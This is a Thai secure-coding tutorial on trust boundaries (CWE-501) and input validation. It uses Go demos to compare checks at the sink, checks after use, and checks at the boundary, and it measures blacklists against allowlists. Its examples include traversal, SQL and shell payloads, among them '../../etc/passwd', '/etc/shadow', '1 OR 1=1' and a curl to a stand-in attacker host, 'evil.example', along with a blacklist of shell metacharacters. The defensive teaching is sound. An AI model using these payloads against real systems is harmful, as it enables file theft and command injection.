ตอนที่แล้วเราจบลงด้วยประโยคที่ผมอยากให้ติดไป: **"ขอบที่กำหนดผิด คือจุดที่ทุกหลักข้างต้นรั่วพร้อมกัน"** · fail closed, secure by default, complete mediation, economy of mechanism — ทั้งสี่หลักถูกบังคับใช้ *ที่ขอบ* ของระบบ · และถ้าเราขีดขอบผิด หลักทั้งสี่ก็ทำงานถูกกับข้อมูลผิดชุด

บทนี้จึงตอบคำถามที่ง่ายที่สุดในทางภาษา และยากที่สุดในทางปฏิบัติ: **อะไรคือ "ข้างนอก" ของระบบคุณ**

MITRE นิยามไว้ใน **CWE-501, Trust Boundary Violation** (การละเมิดขอบเขตความไว้ใจ) ด้วยถ้อยคำที่ผมใช้สอนทุกปี · ถ้าเพิ่งเจอศัพท์นี้ครั้งแรก: **CWE** คือบัญชีกลางของ *รูปแบบ* ช่องโหว่ที่ MITRE ดูแล — เลข CWE เป็นรหัสของรูปแบบปัญหา ไม่ใช่รหัสของเหตุการณ์ที่เกิดจริง (เหตุการณ์ที่เกิดขึ้นจริงมีรหัส CVE แยกอีกชุด)

> "A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted."

แปลตรงตัว: trust boundary คือเส้นที่ลากผ่านโปรแกรม · ฝั่งหนึ่งของเส้น ข้อมูลไม่ถูกไว้ใจ · อีกฝั่งหนึ่ง ข้อมูลถูก *ถือว่า* ไว้ใจได้ · และหน้าที่ของ validation logic คือทำให้ข้อมูลข้ามเส้นได้อย่างปลอดภัย — ย้ายจาก "ไม่ไว้ใจ" ไปเป็น "ไว้ใจ"

สามประโยคสุดท้ายคือทั้งบทนี้ · เพราะมันบอกสองอย่างที่คนมักแยกไม่ออก: **เส้นต้องมีอยู่ก่อน** และ **การตรวจคือพิธีกรรมที่ทำให้ข้ามเส้นได้** · ถ้าไม่มีเส้น การตรวจก็ไม่มีที่อยู่ · และถ้าไม่ตรวจ การข้ามเส้นก็คือการโกหกตัวเอง

ตัวเลขที่บทนี้จะพาไปดูมีห้าชุด · ผมบอกไว้ก่อนว่ากำลังจะวัดอะไร:

- **เดโม 1** — ตัวตรวจที่กระจายอยู่ที่ sink (จุดที่ค่าถูกตีความ/ใช้จริง) กันภัยได้ **5/18**
- **after_use** — ตัวตรวจที่ตรวจครบแต่ช้าเกินไปได้ **18/18** พร้อมผลข้างเคียงที่เกิดก่อนตรวจ **18/18**
- **blacklist** (รายการต้องห้าม) บน payload 45 ตัว ยอมให้ผ่าน **16/45** · เวอร์ชันที่ถอดรหัสก่อนตรวจจึงเหลือ **11/45**
- **allowlist** (รายการอนุญาต) ยอมให้ผ่าน **0/45**
- **เดโม 3** — ค่าที่ "ไว้ใจแล้ว" จาก env กับฐานข้อมูลหลุดออกนอกไดเรกทอรีที่ตั้งใจไว้ **8/12** แถว

## 1. trust boundary: เส้นที่ไม่มีใครวาดให้

### 1.1 เส้นนี้ไม่ได้อยู่ที่กำแพงเครือข่าย

คนส่วนใหญ่ได้ยินคำว่า "ขอบเขต" แล้วนึกถึง firewall, VPC (เครือข่ายส่วนตัวเสมือนในคลาวด์), หรือ network segment (ช่วงเครือข่ายที่แยกออกจากกัน) · แต่ trust boundary ในความหมายของ CWE-501 ไม่ใช่กำแพงเครือข่าย — มันคือ **จุดที่ข้อมูลเปลี่ยนมือ** และจุดนั้นมักอยู่ในโปรเซสเดียวกัน

ยกตัวอย่างสามเส้นที่อยู่ในไฟล์ `.go` ไฟล์เดียว:

- บรรทัดที่ `r.URL.Query().Get("file")` คืนค่าเข้ามา — ข้อมูลเพิ่งออกจาก HTTP parser และเข้ามาในตัวแปรของคุณ
- บรรทัดที่ `filepath.Join(dir, name)` เอา `name` ไปประกอบเป็น path — ที่นี่ `name` ถูก *ตีความ* เป็นที่อยู่บนดิสก์
- บรรทัดที่ `os.Getenv("REPORT_DIR")` คืนค่า — ค่าเดียวกันนี้ถูกตั้งโดยคนอื่น (ผู้ดูแล, container, CI) และโปรเซสของคุณไม่เคยเห็นตอนมันถูกตั้ง

ทั้งสามอยู่ในโปรเซสของคุณ อยู่ในภาษาเดียวกัน อยู่ในไฟล์เดียวกัน · แต่ทั้งสามคือ **ข้อมูลที่ข้ามเส้นเข้ามา** · และเมื่อคุณลากเส้นถูก คุณจะเห็นทันทีว่าที่ที่คุณต้องตรวจคือสามบรรทัดนี้ ไม่ใช่ยี่สิบที่ที่ค่าถูกใช้ต่อ

นี่คือเหตุผลที่ผมบอกนักศึกษาว่า trust boundary เป็นเรื่องของ **ความสัมพันธ์ระหว่างข้อมูลกับผู้ผลิต** ไม่ใช่เรื่องของ topology · คำถามที่ใช้ลากเส้นมีข้อเดียว: *ค่า ๆ นี้ ถูกกำหนดโดยใคร* · ถ้าคำตอบไม่ใช่ "โค้ดที่เราตรวจแล้วในโปรเซสนี้" มันคือข้างนอก

### 1.2 ห้าขอบเขตที่เจอบ่อยที่สุด

ตลอดซีรีส์นี้เราเจอช่องโหว่ที่มาจากขอบเขตเดียวกันซ้ำ ๆ · ห้าแบบนี้ครอบเกือบทั้งหมดของงานจริง:

| ขอบเขต | ตัวอย่างค่าที่ข้าม | ทำไมคนมักไม่นับมัน |
|---|---|---|
| **HTTP request** | query, body, header, cookie, ชื่อไฟล์ใน multipart (body ที่แบ่งหลายส่วน มีไฟล์แนบ) | นับ — แต่ตรวจไม่ครบทุกฟิลด์ (เช่นลืมชื่อไฟล์) |
| **ไฟล์** | ชื่อไฟล์, เนื้อไฟล์, ชื่อ entry ใน archive | "ไฟล์เป็นของผู้ใช้ เขาจะทำอะไรได้" |
| **env / config** | `TMPDIR`, `REPORT_DIR`, ชื่อตารางจาก config | "เราตั้งเองใน compose file" |
| **ฐานข้อมูล** | แถวที่คำขอก่อนหน้าเขียน (ชื่อไฟล์ที่เก็บ, display name) | "เขียนโดยโค้ดเรา" |
| **dependency / API ภายใน** | response ของบริการข้างเคียง, webhook payload (HTTP callback ที่บริการอื่นยิงเข้ามา) | "อยู่ใน VPC เดียวกัน" |

ประโยคที่ต้องพูดให้ชัด: **ทั้งห้าอยู่ "นอก" โปรเซสของคุณ** · ไม่ว่าจะอยู่ใน VPC เดียวกันหรือไม่ ไม่ว่าจะเขียนด้วยภาษาเดียวกันหรือไม่ · สิ่งที่ทำให้ค่าหนึ่ง "ข้างใน" ไม่ใช่ที่มาทางเครือข่าย แต่คือ *มันผ่านการตรวจที่เรากำหนดไว้แล้วหรือยัง*

และสามแถวล่าง — env, ฐานข้อมูล, dependency — คือแถวที่ถูก *ถือว่า* ไว้ใจโดยไม่มีใครเคยตัดสินใจ · ในเดโมที่ 3 ผมจะวัดว่าการถือเช่นนั้นราคาเท่าไร

### 1.3 แปดคำที่ต้องแยกให้ออกก่อนอ่านต่อ

บทนี้ใช้คำนามธรรมแปดคำ · ผมจะวางนิยามให้ครบตรงนี้ แล้วใช้ชื่อเดิมตลอดบท เพื่อไม่ให้เราพูดคนละเรื่อง:

| คำ | ความหมายที่ใช้ในซีรีส์นี้ | กับดักที่พบบ่อย |
|---|---|---|
| **trust boundary** | เส้นแบ่งระหว่างข้อมูลที่คนอื่นผลิต กับข้อมูลที่โค้ดเราตีความได้ | คิดว่าเป็นเรื่องเครือข่าย |
| **input validation** | ตัดสินว่าค่าตรง *สัญญา* ของฟิลด์นั้นไหม แล้วปฏิเสธถ้าไม่ตรง | ตรวจแค่รูปแบบ ไม่ตรวจความหมาย |
| **canonicalization** | ทำให้ค่าอยู่ใน **canonical form** (รูปมาตรฐานเดียว) — ถอด percent-encoding (เขียนอักขระเป็น `%XX` เช่น `/` = `%2f`), clean path, normalize Unicode — *ก่อน* ตรวจ | ตรวจก่อน แล้วชั้นถัดไปถอดรหัสอีกที |
| **sanitization** | แก้ค่าที่ไม่ตรงให้ "ดูปลอดภัย" ด้วยการลบ/แทนอักขระ | ลบแล้วความหมายเปลี่ยน แต่ยังใช้งานต่อ |
| **output encoding** | แปลงค่าตอน *ส่งออก* (HTML escape, parameter binding) | เอาไปใช้แทน input validation |
| **allowlist** | ระบุ *สิ่งที่ดี* แล้วยอมรับเฉพาะที่ตรง | เขียนกฎกว้างเกินจนเกือบเป็น denylist (อีกชื่อของ blacklist) |
| **blacklist** | ระบุ *สิ่งที่ไม่ดี* แล้วปฏิเสธเมื่อเจอ | คิดว่ารายการจะครบ |
| **taint / source → sink** | source = จุดที่ข้อมูลภายนอกเข้ามา · sink = จุดที่ข้อมูลถูกตีความ · taint = ค่าจาก source ที่ยังไม่ผ่านการตรวจ | คิดว่า taint หายไปเมื่อผ่านฟังก์ชันหนึ่งชั้น |

คำคู่สุดท้ายคือคำที่เครื่องมือ static analysis (และ code review ที่ดี) ใช้ทั้งวัน · มันช่วยเพราะมันบังคับให้เราตอบสองคำถามแทนคำถามกำกวม ๆ ว่า "ปลอดภัยไหม": **ค่านี้มาจากไหน (source)** และ **ค่านี้จะถูกตีความที่ไหน (sink)** · ช่องโหว่ทุกตัวในตอนที่ 4 (SQL injection) และตอนที่ 5 (XSS) คือกรณีที่ source กับ sink เชื่อมกันโดยไม่มีอะไรคั่นกลาง

### 1.4 "never trust input" ไม่ได้แปลว่า "ตรวจทุกที่"

นี่คือความเข้าใจผิดที่แพงที่สุดในหัวข้อนี้ · ถ้าคุณตีความ "never trust input" ว่า "ใส่เช็คให้เยอะที่สุด" คุณจะได้ระบบที่ *ดูเหมือน* ตรวจหนัก แต่จริง ๆ แล้วไม่มีใครตอบได้ว่าค่าหนึ่งผ่านอะไรมาบ้าง

คำว่า **shotgun parsing** มาจากวงการ **LangSec** (Language-theoretic Security — แนวทางวิจัยที่ถือว่าการ *parse* อินพุตให้ถูกต้องคือด่านความปลอดภัยหลัก ไม่ใช่การหว่านเช็ค) · Alexis King ยกนิยามนี้มาจากเปเปอร์ *The Seven Turrets of Babel* ของ Momot, Bratus, Hallberg และ Patterson (IEEE SecDev 2016) แล้วอธิบายต่อในโพสต์ *Parse, don't validate* — ซึ่งเป็นที่ที่คนส่วนใหญ่ (รวมถึงผม) เจอคำนี้ครั้งแรก:

> "Shotgun parsing is a programming antipattern whereby parsing and input-validating code is mixed with and spread across processing code—throwing a cloud of checks at the input, and hoping, without any systematic justification, that one or another would catch all the "bad" cases."

เปเปอร์เดิมต่ออีกประโยคที่ผมคิดว่าสำคัญกว่าตัวนิยาม: การหว่านเช็คทำให้โปรแกรม *เสียความสามารถที่จะปฏิเสธอินพุตที่ไม่ถูกต้อง* — เพราะกว่าจะเจอ error ก็มีบางส่วนของอินพุตนั้นถูกประมวลผลไปแล้ว

"การหว่านเช็ค" ฟังดูขยัน แต่ผลลัพธ์มีสามอย่างที่แย่พร้อมกัน: **(ก)** ไม่มีใครรู้ว่าค่าหนึ่งผ่านการตรวจอะไรมาบ้าง เพราะการตรวจกระจายอยู่ตามที่ใช้ **(ข)** เช็คที่เขียนต่างที่กันตัดสินไม่ตรงกัน — sink หนึ่งปฏิเสธชื่อที่มีขีด อีก sink ปล่อยผ่าน **(ค)** เมื่อสัญญาของฟิลด์เปลี่ยน คุณต้องแก้หลายที่ และจะลืมหนึ่งที่

การตีความที่ผมใช้และจะพิสูจน์ด้วยตัวเลขในหัวข้อถัดไปคือ: **ตรวจครั้งเดียว ที่เส้น กับฟังก์ชันเดียวต่อฟิลด์** · แล้วทุกอย่างที่อยู่ข้างในรับค่า *ที่ผ่านแล้ว* เท่านั้น

## 2. เดโม 1: ที่ตั้งของตัวตรวจตัดสินผลมากกว่าความละเอียดของมัน

### 2.1 ชุดข้อมูล

เดโมแรกจำลองท่อเดียวของระบบวางบิล · มีค่าที่ข้ามขอบเขตเข้ามา **40 ตัว** จาก **5 ขอบเขต** (ขอบเขตละ 8 ตัว) และทุกค่าจบลงที่ **sink 4 ตัว** ได้แก่ `sql` (ประกอบ query), `path` (เปิดไฟล์), `shell` (สร้างอาร์กิวเมนต์), `redirect` (ส่งต่อไปปลายทาง)

ใน 40 ตัวนั้น **18 ตัวเป็นภัย** และ **22 ตัวเป็นค่าปกติ** · ค่าปกติไม่ได้เป็นของประดับ: มันคือตัววัดว่า validator ของคุณไปตัดของดีทิ้งหรือเปล่า — และเราจะเห็นว่ามีแบบหนึ่งที่ตัดทิ้งจริง

แต่ละค่าพก "สัญญา" ของตัวเองมาด้วย (ฟิลด์ `rule`) เพราะในระบบจริง แต่ละฟิลด์มีรูปแบบที่ถูกต้องต่างกัน — ชื่อไฟล์กับชื่อตารางไม่มีทางใช้กฎเดียวกันได้

### 2.2 ประตูเดียว: `parse`

หัวใจของเดโม 1 คือฟังก์ชันเดียวที่ผลิตค่าที่ใช้ได้:

```go
// parse คือจุดเดียวที่ค่าจากภายนอกกลายเป็นค่าที่ใช้ได้
//
// มันคืน error เมื่อค่าไม่ตรงสัญญา และเพราะมันเป็นฟังก์ชันเดียวที่ผลิตค่า
// ที่ผ่านการตรวจ สิ่งที่อยู่หลังขอบเขตจึงไม่ต้องเดาอีกว่าค่า "น่าจะ" ปลอดภัย
// (ไอเดียนี้มีชื่อว่า "parse, don't validate")
func parse(r rule, raw string) (string, error) {
	switch r {
	case ruleIdent:
		if !identRe.MatchString(raw) {
			return "", fmt.Errorf("ident: %q ไม่ตรงรูปแบบที่กำหนด", raw)
		}
	case ruleRelPath:
		if !relRe.MatchString(raw) || strings.Contains(raw, "..") {
			return "", fmt.Errorf("rel_path: %q ไม่ใช่ path สัมพัทธ์ที่ปลอดภัย", raw)
		}
	case ruleAbsPath:
		if !absRe.MatchString(raw) || strings.Contains(raw, "..") {
			return "", fmt.Errorf("abs_path: %q ไม่ใช่ path สัมบูรณ์ที่ปลอดภัย", raw)
		}
	case ruleRedirect:
		if !strings.HasPrefix(raw, "/") || strings.HasPrefix(raw, "//") ||
			strings.ContainsAny(raw, ":\\") {
			return "", fmt.Errorf("redirect: %q ไม่ใช่ปลายทางภายใน", raw)
		}
	default:
		return "", fmt.Errorf("rule: ไม่รู้จัก %q", r)
	}
	return raw, nil
}
```

กฎที่ `parse` ใช้จริงคือสาม regex นี้ — และมันคือส่วนที่คนอ่านข้ามบ่อยที่สุด:

```go
var (
	identRe = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,31}$`)
	relRe   = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9/._-]{0,63}$`)
	absRe   = regexp.MustCompile(`^/[A-Za-z0-9/._-]{1,63}$`)
)
```

ตัวแรกของทุกตัวคือ `[A-Za-z0-9]` — บังคับว่าค่าต้อง **ขึ้นต้นด้วยตัวอักษรหรือตัวเลข** ไม่ใช่จุด ไม่ใช่ขีด ไม่ใช่สแลช · นี่คือเหตุผลที่ `../../etc/passwd` ตกตั้งแต่ตัวอักษรตัวแรกในกฎ `rel_path` · ส่วน `abs_path` ยอมให้ขึ้นต้นด้วย `/` ได้ แต่ห้าม `..` แยกอีกชั้น · ตัวเลขในวงเล็บปีกกาคือความยาวสูงสุด: `ident` 32 ตัว, path 64 ตัว

สามอย่างที่ควรสังเกตในฟังก์ชันนี้:

1. **มันเป็น allowlist ต่อฟิลด์** · `identRe` ไม่มีรายการ "คำต้องห้าม" ให้ต้องอัปเดต — มันแจกแจง *สิ่งที่ยอมรับ* แทน
2. **มันตรวจเชิงโครงสร้าง ไม่ใช่ไล่ทีละอักขระ** · `rel_path` ต้องขึ้นต้นด้วยตัวอักษร/ตัวเลข (จึงขึ้นต้นด้วย `/` ไม่ได้) และต้องไม่มี `..` · คำว่า `rel_path` ในที่นี้คือ relative path (path สัมพัทธ์ — อ้างจากไดเรกทอรีปัจจุบัน) ส่วน `abs_path` คือ absolute path (path สมบูรณ์ — เริ่มจาก `/`) ซึ่งมีกฎแยกของตัวเอง
3. **มันคืนค่า ไม่ได้คืน boolean** · ผู้เรียกได้ค่าที่ผ่านแล้วกลับไปใช้ ไม่ใช่ได้ "true" แล้วเอาค่าดิบไปใช้ต่อ · ความต่างนี้ฟังดูเล็ก แต่เป็นความต่างระหว่าง "ตรวจแล้ว" กับ "ตรวจแล้วแต่ลืมใช้ผล"

### 2.3 ตัวตรวจที่อยู่ผิดที่: สองกลไกของความล้มเหลว

ในโค้ดจริง การตรวจมักไม่ได้อยู่ที่ `parse` · มันอยู่ที่ sink เพราะคนที่เจอปัญหาเป็นคนเขียนเช็ค · เดโมจำลองแบบนั้น:

```go
// sinkChecks คือตัวตรวจที่เขียนไว้ "ที่ sink" — ต่างกันทุก sink เพราะคนละคนเขียน
// และ sink ที่ไม่มีฟังก์ชันในแผนที่นี้คือ sink ที่ไม่มีใครตรวจเลย
//
// นี่คือรูปแบบที่พบบ่อยที่สุดในโค้ดจริง: การตรวจถูกเขียนขึ้นที่จุดที่เจอปัญหา
// ไม่ใช่ที่จุดที่ข้อมูลเข้ามา ผลคือชุดการตรวจที่ไม่ครบและไม่สอดคล้องกัน
func sinkChecks() map[sink]func(string) bool {
	return map[sink]func(string) bool{
		// sql: ปฏิเสธอักขระที่เปลี่ยนความหมายของ query
		sinkSQL: func(v string) bool {
			return !strings.ContainsAny(v, "'\";-")
		},
		// shell: จำกัดความยาว + อักขระที่ใช้ต่อคำสั่งได้
		sinkShell: func(v string) bool {
			return len(v) <= 32 && !strings.ContainsAny(v, "$`;|&")
		},
		// redirect: ต้องเป็น path ภายใน และไม่ขึ้นต้นด้วย //
		sinkRedirect: func(v string) bool {
			return strings.HasPrefix(v, "/") && !strings.HasPrefix(v, "//")
		},
		// sinkPath: ไม่มี — "path ถูกทำให้สะอาดตั้งแต่ต้นทางแล้ว"
	}
}
```

อ่านคอมเมนต์บรรทัดสุดท้ายให้ช้า ๆ: **`sinkPath` ไม่มีตัวตรวจ** · ไม่ใช่เพราะใครลืม แต่เพราะมีคนคิดว่า "ต้นทางทำให้สะอาดแล้ว" · และในเดโมนี้ `path` คือ sink ที่รับค่ามากที่สุด (จากชื่อไฟล์อัปโหลดและจากแถวฐานข้อมูล) — ซึ่งเป็น sink ที่อันตรายที่สุดในงานจริงด้วย

กลไกที่สองคือการข้ามค่าจาก source ที่ถือว่า "ข้างใน":

```go
// runAtSink — ตรวจที่ปลายทาง และข้ามค่าจาก source ที่ถือว่า "ข้างใน"
func runAtSink(it item) (accepted, effect bool) {
	if it.src.internal() {
		// สมมติฐานที่แพงที่สุดในเดโมนี้: "ค่าจาก env/db ไม่ต้องตรวจ"
		return true, true
	}
	chk := sinkChecks()[it.sink]
	if chk == nil {
		return true, true
	}
	if !chk(it.raw) {
		return false, false
	}
	return true, true
}
```

และอีกสองแบบที่ใช้เทียบ — แบบหนึ่งตรวจครบแต่ตรวจช้า อีกแบบตรวจครั้งเดียวที่เส้น:

```go
// runAfterUse — ตรวจครบทุกค่า แต่ตรวจ *หลัง* ค่าไปถึง sink แล้ว
// ตัวเลขการบล็อกจะสวย และไม่มีประโยชน์: ผลข้างเคียงเกิดขึ้นไปแล้ว
func runAfterUse(it item) (accepted, effect bool) {
	_, err := parse(it.rule, it.raw)
	return err == nil, true
}
```

```go
// runAtBoundary — ตรวจครั้งเดียวตอนข้ามขอบเขต แล้วให้ sink รับค่าที่ผ่านแล้ว
func runAtBoundary(it item) (accepted, effect bool) {
	if _, err := parse(it.rule, it.raw); err != nil {
		return false, false
	}
	return true, true
}
```

### 2.5 อ่านตัวเลขสามแถวนี้

**แถว `at_sink` — 5/18.** ตัวตรวจมีสามตัว (sql, shell, redirect) ครอบขอบเขตแค่ **2/5** · ภัยผ่านไปถึง sink **13/18** · และมันยัง *ตัดของดีทิ้ง* หนึ่งตัว คือ `invoice-2026-10` ที่เป็นชื่อใบแจ้งหนี้ปกติ · เพราะเช็คของ sink `sql` เขียนว่า "ปฏิเสธถ้ามี `'` `"` `;` หรือ `-`" — ซึ่งเป็นวิธีกัน SQL comment (`--`) ที่ดูสมเหตุสมผล แต่ไปโดนชื่อที่มีขีดเดียว

ตรงนี้มีบทเรียนย่อยที่ผมอยากให้เห็นชัด: **ตัวตรวจที่เขียนเพื่อกัน payload เฉพาะ มักตัดของดีทิ้งด้วย** · `21/22` คือราคาที่จ่ายสำหรับการเขียนกฎจากตัวอย่างที่คิดถึง

**แถว `after_use` — 18/18 แต่ 18/18.** นี่คือแถวที่ผมใช้สอนเสมอว่า *ตัวเลขที่ดีที่สุดในตารางอาจเป็นตัวเลขที่แย่ที่สุด* · การบล็อกครบ 18 จาก 18 ฟังดูสมบูรณ์แบบ จนคุณอ่านคอลัมน์ `effects_first`: ภัยทั้ง 18 ตัว **ถึง sink ก่อนถูกตรวจ** · query ถูกประกอบแล้ว ไฟล์ถูกเปิดแล้ว คำสั่งถูกสร้างแล้ว — แล้วเราจึงตรวจและปฏิเสธ · ในระบบจริง ผลข้างเคียงที่เกิดก่อนนั้นย้อนกลับไม่ได้: แถวถูกลบไปแล้ว, ไฟล์ถูกอ่านไปแล้ว, คำสั่งถูกรันไปแล้ว

ถ้าคุณมีตัวตรวจที่รายงาน "บล็อก 100%" และยังมี incident อยู่ ให้ไปดูว่ามันตรวจ *เมื่อไร* ไม่ใช่ตรวจ *อะไร*

**แถว `at_boundary` — 18/18 และ 0/18.** ตัวตรวจหนึ่งฟังก์ชัน ครอบ 5/5 · บล็อก 18 จาก 18 · ไม่มีผลข้างเคียงก่อนตรวจ · และรับค่าปกติได้ 22 จาก 22 · ตัวเลขชุดนี้ไม่ได้เกิดจากความละเอียดกว่า — กฎของ `parse` เข้มกว่านั้นจริง แต่ประเด็นหลักคือ *ตำแหน่ง*: เพราะมันอยู่ที่เส้น จึงไม่มีทางที่ค่าจะถึง sink โดยไม่ผ่านมัน

ตารางที่สองอธิบายว่าทำไม `at_sink` ได้แค่ 5/18 · สองแถวแรกถูกตรวจ — `http_query` มีภัย 3 ตัวและถูกกัน 2 ตัว · `http_body` มีภัย 4 ตัวและถูกกัน 3 ตัว · แต่สามแถวล่างถูกข้ามทั้งหมด: `upload_filename` เพราะ sink `path` ไม่มีตัวตรวจ · `env` และ `db_row` เพราะถูก *ถือว่า* อยู่ข้างใน · สามแถวล่างนี้คือภัย 11 ตัวจาก 18 ที่ไม่มีใครแตะต้อง

### 2.6 ก้าวถัดไปของไอเดียนี้: ให้ชนิดข้อมูลพา "ผ่านแล้ว" ไปด้วย

`parse` ในเดโมคืน `(string, error)` · ซึ่งแปลว่ายังมีทางที่ผู้เรียกจะหยิบ `it.raw` ไปใช้แทนผลของ `parse` · ทางแก้ที่แข็งแรงกว่าคือทำให้ *ชนิด* ของค่าเป็นตัวแทนความจริง:

```text
type SafePath struct{ p string }   // ฟิลด์ไม่ export — แพ็กเกจอื่นประกอบค่าดิบเองไม่ได้
type Ident    struct{ v string }
type Redirect struct{ u string }

func openReport(p SafePath) { ... }   // รับได้เฉพาะค่าที่ผลิตในแพ็กเกจนี้
```

เพราะฟิลด์ `p` ไม่ export แพ็กเกจอื่นจึงเขียน `SafePath{p: raw}` เองไม่ได้ — ทางเดียวคือเรียกตัวสร้างที่เรียก `parse` ให้ · การลืมตรวจจึงกลายเป็น *compile error* ไม่ใช่ช่องโหว่

ข้อจำกัดที่ต้องพูดตรง ๆ ก่อนจะขายไอเดียนี้: กฎแบบนี้ **บังคับได้เมื่อผู้เรียกอยู่ต่างแพ็กเกจ** · ถ้าผู้เรียกอยู่ในแพ็กเกจเดียวกัน มันยังเขียน `SafePath{p: raw}` ได้ตรง ๆ — ตรงนั้นเป็น *วินัย* ไม่ใช่การบังคับของ compiler · แต่ในโปรเจกต์จริง "ตัวตรวจอินพุต" กับ "ที่ใช้ค่า" แทบไม่เคยอยู่ไฟล์เดียวกัน ซึ่งเป็นจุดที่กำไรเกิดขึ้นจริง

นี่คือสิ่งที่ Alexis King เรียกว่า "parse, don't validate": ไม่ใช่แค่ตรวจให้ผ่าน แต่แปลงข้อมูลเป็นชนิดที่ *เป็นไปไม่ได้* จะไม่ผ่าน

ผมไม่ได้ทำถึงขั้นนั้นในเดโมนี้ (มันจะทำให้โค้ดยาวและรบกวนจุดที่ต้องการวัด) — แต่ถ้าคุณจะเอาแนวคิดนี้ไปใช้ นี่คือก้าวที่คุ้มที่สุด: **ย้ายความรับผิดชอบจากการจำของคนเขียน ไปที่ compiler**

## 3. เดโม 2: allowlist กับ blacklist — ต่างกันที่คำถาม ไม่ใช่ที่ความยาวของรายการ

เดโม 1 บอกว่า *ตรวจที่ไหน* · แต่ยังไม่ได้เปิดดูว่า 3 ตัวตรวจที่เขียนกันที่ sink นั้นเขียนแบบไหน — เดโม 2 เปิดไส้ในของตัวตรวจเหล่านั้น

### 3.1 ชุดทดสอบ

เดโมที่สองวัดตัวตรวจแบบที่ทีมเขียนกันบ่อยที่สุด · ชุดข้อมูลคือ **payload 45 ตัว** จาก **5 ตระกูล** (sql, path, shell, redirect, markup) ตระกูลละ 9 ตัว · `markup` คือ payload ที่เป็นแท็ก HTML/script · และ **ค่าปกติ 32 ตัว** ที่เป็นชื่อในรูปแบบที่ระบบของเราผลิตเองได้จริง

ใน 45 ตัวนั้นมี **5 ตัวที่ใส่ percent-encoding** มา (`..%2f`, `%2e%2e%2f`, double-encode, overlong UTF-8) — double-encode คือเข้ารหัสซ้อนสองชั้น, overlong คือเข้ารหัสด้วยไบต์เกินจำเป็นที่ตัวถอดรหัสบางตัวยังรับ · ห้าตัวนี้คือชุดที่ทำให้เห็นความต่างระหว่าง "ตรวจสตริงดิบ" กับ "ถอดรหัสก่อนตรวจ" · คำว่า **ถอดรหัส** ในบทนี้หมายถึง decode — แปลง `%2f` กลับเป็น `/` ไม่ใช่การถอดรหัสลับ (decrypt)

ใน 32 ตัวปกติ มีสองตัวที่ *ดูเหมือน* อันตราย: `report--2026-10` และ `scan--01` · มันเป็นชื่อที่ถูกต้อง (มีขีดสองตัว) และมันจะกลายเป็นตัววัด false positive (ตัดของดีทิ้ง) ของ blacklist

### 3.2 ตัวตรวจสามแบบ

```go
// rawBad คือรายการ "อักขระหรือลำดับที่ห้าม" แบบ blacklist ที่ทีมมักเขียนกัน
var rawBad = []string{"'", "\"", "..", ";", "<", ">", "$(", "--", "|", "`"}
```

```go
// acceptRaw — blacklist บนค่าดิบ: ปฏิเสธเมื่อเจอลำดับที่คิดว่าไม่ดี
//
// ปัญหาเชิงโครงสร้าง: มันตอบคำถาม "ค่านี้มีอะไรที่ฉันคิดว่าแย่ไหม"
// ไม่ใช่ "ค่านี้เป็นชื่อที่ถูกต้องหรือเปล่า" · คำถามแรกมีคำตอบไม่จำกัด
func acceptRaw(v string) bool {
	return !containsAny(v, rawBad)
}
```

```go
// acceptDecoded — blacklist ที่ถอดรหัสและแปลงตัวพิมพ์เล็กก่อนตรวจ
// ดีขึ้นจริง (จับ payload ที่ซ่อนด้วย %2f ได้) แต่ยังเป็น blacklist
func acceptDecoded(v string) bool {
	d, err := url.QueryUnescape(v)
	if err != nil {
		d = v
	}
	d = strings.ToLower(d)
	// คัดลอก rawBad ลง slice ใหม่แล้วต่อรายการเพิ่ม (ไม่แก้ rawBad ตัวเดิม)
	bad := append(append([]string{}, rawBad...), "%2e", "%2f", "javascript:", "\\", "\n")
	return !containsAny(d, bad)
}
```

ตัวที่สามพึ่ง regex ตัวเดียว — และมีอีกเช็คหนึ่งที่ขาดไม่ได้:

```go
var allowRe = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`)
```

ทำไมยังต้องมี `!strings.Contains(v, "..")` แยกอีกชั้น ทั้งที่ regex ดูเข้มแล้ว · เพราะ `.` เป็นหนึ่งในอักขระที่ regex ยอมรับ (จำเป็น — ชื่ออย่าง `invoice.1042.pdf` มีจุด) · แปลว่า `..` *ผ่าน* regex ได้ · เช็คที่สองจึงไม่ซ้ำซ้อน: มันบังคับเงื่อนไขเชิงโครงสร้าง (ห้ามจุดสองตัวติดกัน) ที่ regex แบบนี้แสดงไม่ได้

```go
// acceptAllowlist — ตอบคำถามเดียว: "ค่านี้เป็นชื่อที่ถูกต้องตามสัญญาไหม"
// ไม่ต้องรู้จัก payload ใด ๆ เลย ไม่ต้องอัปเดตเมื่อมีเทคนิคใหม่
func acceptAllowlist(v string) bool {
	return allowRe.MatchString(v) && !strings.Contains(v, "..")
}
```

ความต่างเชิงโครงสร้างอยู่ที่ *ทิศของคำถาม* · สองตัวแรกถามว่า "มีอะไรน่าสงสัยไหม" — คำถามนี้ต้องมีรายการของ "น่าสงสัย" ที่ครบ และรายการนั้นจะไม่มีวันครบ · ตัวที่สามถามว่า "ค่านี้เป็นชื่อที่ถูกต้องไหม" — คำถามนี้ตอบได้ด้วยกฎเดียว และ payload ใหม่ไม่ทำให้กฎนี้ผิด

### 3.3 ผลรันจริง

### 3.4 อ่านตัวเลข

**`blacklist_raw` — 16/45 และ 4/5 ตระกูล.** มันบล็อก payload ที่ "หน้าตาคลาสสิก" ได้จริง: quote, `..`, `;`, `<script>` ล้วนถูกปฏิเสธ · แต่ภัยที่ยังผ่านไปคือ 16 ตัว และมันกระจายอยู่ 4 ตระกูล · และมันตัดของดีทิ้ง **2/32** — สองชื่อที่มีขีดสองตัว ซึ่งเป็นชื่อที่ถูกต้อง

**`blacklist_decoded` — 11/45 และ 0/5 encoded.** นี่คือการปรับปรุงที่ *ถูกทิศ* และได้ผลจริง: payload ที่ใส่ percent-encoding มาทั้ง 5 ตัวถูกจับได้หมด (จาก `2/5` เหลือ `0/5`) · แต่ยังเหลือ 11 ตัวที่ผ่าน และยังกระจาย 4 ตระกูล — เพราะการถอดรหัสไม่ได้ช่วยกับ payload ที่ไม่ได้ซ่อนอะไรเลย เช่น `1 OR 1=1`, `/etc/shadow`, `a && curl evil.example/x`, `//evil.example/login`

